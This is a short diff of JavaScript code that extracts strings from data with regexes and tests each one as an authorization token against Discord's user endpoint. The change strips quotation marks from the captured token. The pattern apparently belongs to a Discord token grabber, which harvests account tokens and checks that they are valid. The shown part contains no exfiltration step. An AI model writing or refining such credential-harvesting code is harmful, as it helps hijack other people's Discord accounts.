@@ -15,10 +15,10 @@ try {
 
                 let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                 if (match != null) {
-					console.log(match)
+                    match = match.replace(/"/g, '')
                     await fetch(`https://discord.com/api/v6/users/@me`, {
                         headers: {
-                            "authorization": match
+                            "authorization": `${match}`
                         }
                     }).then(resp => resp.json()).then(response => {
                         if(response.id) {
@@ -40,10 +40,10 @@ try {
 
                 let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                 if (match != null) {
-					console.log(match)
+					match = match.replace(/"/g, '')
                     await fetch(`https://discord.com/api/v6/users/@me`, {
                         headers: {
-                            "authorization": match
+                            "authorization": `${match}`
                         }
                     }).then(resp => resp.json()).then(response => {
                         if(response.id) {
